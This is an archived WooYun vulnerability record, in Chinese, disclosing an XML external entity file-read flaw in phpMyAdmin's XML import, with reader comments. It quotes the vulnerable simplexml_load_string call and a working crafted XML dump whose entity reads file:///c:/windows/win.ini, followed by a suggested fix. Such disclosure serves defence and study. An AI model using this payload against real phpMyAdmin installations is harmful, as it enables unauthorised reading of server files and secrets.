{"id": 22024, "wybug_id": "wooyun-2011-03185", "wybug_title": "PhpMyadmin任意文件读取漏洞", "wybug_corp": "PhpMyadmin", "wybug_author": "80sec", "wybug_date": "2011-11-01 23:14", "wybug_open_date": "2011-11-01 23:15", "wybug_type": "默认配置不当", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-11-01：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2011-11-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： PhpMyadmin实现中错误的使用了simplexml_load_string函数用于xml解析，但是该函数中默认并没有处理好外部实体的安全性，导致用户可以借助xml文件读取和访问应用有权限访问的系统和网络资源 详细说明：  libraries/import/xml.php中\nunset($data);/** * Load the XML string * * The option LIBXML_COMPACT is specified because it can * result in increased performance without the need to * alter the code in any way. It's basically a freebee. */$xml = simplexml_load_string($buffer, \"SimpleXMLElement\", LIBXML_COMPACT);unset($buffer);/** * The XML was malformed */if ($xml === FALSE) {\n可以使用系统中的import功能导入一个精心构造的xml文件\n<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE wooyun [  <!ENTITY hi80sec SYSTEM \"file:///c:/windows/win.ini\">]><!--- phpMyAdmin XML Dump- version 3.4.4- http://www.phpmyadmin.net-- 主机: localhost- 生成日期: 2011 年 11 月 01 日 14:56- 服务器版本: 5.1.28- PHP 版本: 5.2.6--><pma_xml_export version=\"1.0\" xmlns:pma=\"http://www.phpmyadmin.net/some_doc_url/\">    <!--    - Structure schemas    -->    <pma:structure_schemas>        <pma:database name=\"test\" collation=\"utf8_general_ci\" charset=\"utf8\">            <pma:table name=\"ts_ad\">                &hi80sec;            </pma:table>        </pma:database>    </pma:structure_schemas>    <!--    - 数据库: 'thinksns'    -->    <database name=\"thinksns\">        <!-- 表 ts_ad -->    </database></pma_xml_export>\n来读写文件，系统错误信息会直接显示出文件内容   漏洞证明：  \n\n   修复方案：  换其他操作xml的方式，譬如xml_parse   版权声明：转载请注明来源 80sec@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2011-11-01 23:17 |    \t\tBNE \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:7        | NIce)\t\t \n  牛逼！如果不是root，也可以通过这个读文件了！php和mysql不是一个用户，也可以读了    \n     2011-11-01 23:18 |    \t\t80sec \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:5        | 不要停止我的音乐)\t\t \n  http://www.80sec.com/xml-entity-injection.html的精确利用    \n     2011-11-02 14:03 |    \t\trayh4c \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:23        )\t\t \n  膜拜啊，藏得这么深的东西你都能发现。    \n     2012-06-17 12:05 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  libraries/import/xml.php xml.php我版本的phpmyadmin没有 难道目录不同？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}